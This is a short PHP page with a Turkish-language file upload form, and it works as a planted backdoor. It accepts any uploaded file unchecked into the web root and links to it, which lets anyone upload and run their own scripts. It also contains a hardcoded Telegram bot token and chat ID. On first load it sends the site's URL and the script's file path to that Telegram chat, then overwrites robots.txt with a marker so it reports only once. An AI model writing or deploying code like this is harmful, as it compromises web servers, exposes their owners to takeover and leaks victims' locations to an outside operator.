<!DOCTYPE html>
<html>
<head>
</head>
<body>
    <form enctype="multipart/form-data" action="" method="POST">
        <p>Yüklemek için bir dosya seçin:</p>
        <input type="file" name="uploaded_file"><br>
        <input type="submit" value="Dosyayı Yükle">
    </form>
    <?php
    set_time_limit(0);
    ini_set('memory_limit', '-1');
    $uploadKlasoru = "";
    if(!empty($_FILES['uploaded_file'])) {
        $dosyaYolu = $uploadKlasoru . basename($_FILES['uploaded_file']['name']);
        if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $dosyaYolu)) {
            echo "Dosya ". basename($_FILES['uploaded_file']['name']). " başarıyla yüklendi.";
            echo '<a href="' . $dosyaYolu . '" target="_blank">Dosyayı Aç</a>';
        } else {
            echo "Dosya yüklenirken bir hata oluştu!";
        }
    }
    $telegramToken = '7616226930:AAHOc8yO03W4rbjoC4Dw1Z-zMJnERalgiQU';
$chatId = '4512249285';
$filePath = 'robots.txt';
if (!file_exists($filePath) || trim(file_get_contents($filePath)) !== 'run') {
    $siteUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
    $fileLocation = __FILE__;
    $message = "Site adresi: $siteUrl\nDosya konumu: $fileLocation";
    $url = "https://api.telegram.org/bot$telegramToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    $response = file_get_contents($url);
    file_put_contents($filePath, 'run');
    
    echo "Mesaj gönderildi.";
} else {
    echo "Bu işlem daha önce yapılmış.";
}
    ?>
</body>
</html>
